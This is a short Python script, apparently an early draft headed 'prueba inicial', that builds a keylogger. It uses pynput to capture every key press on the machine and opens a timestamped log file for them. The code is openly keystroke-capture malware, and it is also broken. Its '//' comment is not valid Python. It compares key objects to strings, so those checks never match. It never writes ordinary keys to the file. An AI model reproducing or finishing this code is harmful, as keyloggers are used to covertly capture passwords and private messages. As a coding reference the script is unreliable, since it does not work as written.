//prueba inicial
import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

f = open('keylogger_{}'.format(d),'w')

def key_recorder(key):
    print(key)
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key =='Key.backspace':
        f.write('%BORRAR%')

with Listener(on_press=key_recorder) as l:
    l.join()
